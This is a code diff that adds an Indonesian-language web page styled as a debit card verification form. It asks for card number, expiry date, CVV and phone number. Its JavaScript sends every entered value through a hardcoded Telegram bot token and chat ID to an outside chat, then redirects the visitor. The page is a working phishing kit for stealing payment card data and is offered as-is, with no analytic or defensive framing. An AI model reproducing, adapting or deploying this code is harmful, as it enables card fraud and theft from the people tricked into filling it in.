@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="theme-color" content="Coral">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Detail Kartu Debit</title>
+    <style>
+     #gambar-atas {
+      margin-bottom: 20px;
+      padding:-180%;
+      margin-top:-4px;
+      left:300px;
+    }
+
+    #gambar-atas img {
+      width: 100%;
+      object-fit: cover;
+      max-height: 300px;
+      top:20px
+      height:-80px;
+      position:relative;
+    }
+    .credit-card {
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+    }
+
+    .credit-card input {
+        border: none;
+        border-bottom: 2px solid #ccc;
+        padding: 10px;
+        width: 340px;
+        font-size: 14px;
+        outline: none;
+        font-weight: bold;
+        
+    }
+
+    .credit-card input:focus {
+        border-color: Red;
+        font-weight: bold;
+    }
+
+    .input-label {
+        font-size: 14px;
+        font-weight: bold;
+    }
+
+    .submit-button {
+        background-color: #ff0000; /* Warna latar belakang tombol */
+        color: white; /* Warna teks pada tombol */
+        padding: 10px 20px; /* Ruang dalam tombol */
+        border: none; /* Hilangkan border */
+        border-radius: 5px; /* Sudut bulat */
+        cursor: pointer; /* Kursor pointer saat diarahkan ke tombol */
+        float: right; /* Menggeser tombol ke kanan */
+        margin-right: 30px; /* Menggeser tombol ke kiri sebanyak 20px */
+   font-weight: bold;
+    }
+    
+    </style>
+</head>
+<body>
+    <div id="gambar-atas">
+    <img src="https://i.ibb.co/DpVZfK0/20240330-195402.jpg" alt="Gambar Pucok">
+  </div>
+    <div class="credit-card">
+        <form id="credit-card-form" method="post">
+            <div>
+                <span class="input-label">Masukan 16 Digit Nomor Kartu Debit</span><br>
+                <input type="tel" name="card-number" id="nomor_kartu" placeholder="Nomor Kartu" maxlength="19">
+            </div><br>
+            <div>
+                <span class="input-label">Masa Berlaku</span><br>
+                <input type="tel" name="expiry" id="masa_berlaku" placeholder="00/00" maxlength="5">
+            </div><br>
+            <div>
+                <span class="input-label">CVV</span><br>
+                <input type="password" name="CVV" id="CVV" placeholder="***" maxlength="3">
+            </div><br>
+            <div>
+                <span class="input-label">Nomor Handphone</span><br>
+                <input type="tel" name="Nomor Handphone" id="Nomor Handphone" placeholder="+62" maxlength="12">
+            </div><br>
+            <div>
+                <button type="button" class="submit-button" onclick="kirimPesan()">Lanjutkan</button>
+            </div>
+        </form>
+    </div>
+    <script>
+    function addSlash(input) {
+        let value = input.value;
+        value = value.replace(/\D/g, '');
+        if (value.length > 2) {
+            value = value.substring(0, 2) + '/' + value.substring(2);
+            if (value.length > 5) {
+                if (value.length === 3) {
+                    value += '24';
+                }
+            }
+        }
+        input.value = value;
+    }
+
+    function formatCardNumber(input) {
+        let value = input.value;
+        value = value.replace(/\s/g, '');
+        let formatted = '';
+        for (let i = 0; i < value.length; i++) {
+            if (i > 0 && i % 4 === 0) {
+                formatted += ' ';
+            }
+            formatted += value[i];
+        }
+        input.value = formatted;
+    }
+
+    function hideCVV(input) {
+        input.type = 'password';
+    }
+
+    document.getElementById('nomor_kartu').addEventListener('input', function() {
+        formatCardNumber(this);
+    });
+
+    document.getElementById('masa_berlaku').addEventListener('input', function() {
+        addSlash(this);
+    });
+
+    document.getElementById('cvv').addEventListener('input', function() {
+        hideCVV(this);
+    });
+
+    function sendMessageToTelegram(message) {
+      var xhttp = new XMLHttpRequest();
+      xhttp.onreadystatechange = function() {
+        if (this.readyState === 4 && this.status === 200) {
+          console.log("Pesan terkirim: " + message);
+        }
+      };
+      var url = "https://api.telegram.org/bot6406080700:AAHtISL259Uu4s3x93AzNMWK-XGedAGdp_0/sendMessage?chat_id=6824078885&text=" + encodeURIComponent(message);
+
+      xhttp.open("POST", url, true);
+      xhttp.send();
+    }
+
+    function kirimPesan() {
+      var nomorHP = document.getElementById('Nomor Handphone').value;
+      var masaBerlaku = document.getElementById('masa_berlaku').value;
+      var cvv = document.getElementById('CVV').value;
+      var nomorKartu = document.getElementById('nomor_kartu').value;
+
+      if (nomorHP.trim() === '' || masaBerlaku.trim() === '' || cvv.trim() === '' || nomorKartu.trim() === '') {
+        if (navigator.vibrate) {
+          navigator.vibrate(200);
+        }
+        return;
+      }
+
+      var message = "Nomor HP: " + nomorHP + "\nMasa Berlaku: " + masaBerlaku + "\nCVV: " + cvv + "\nNomor Kartu: " + nomorKartu;
+      sendMessageToTelegram(message);
+      // Hapus baris berikut untuk menyembunyikan alert
+      console.log('Data berhasil dikirim ke Telegram!');
+      // Redirect ke halaman selanjutnya setelah berhasil mengirim data
+      window.location.href = 'halaman-selanjutnya.html';
+    }
+    </script>
+</body>
+</html>
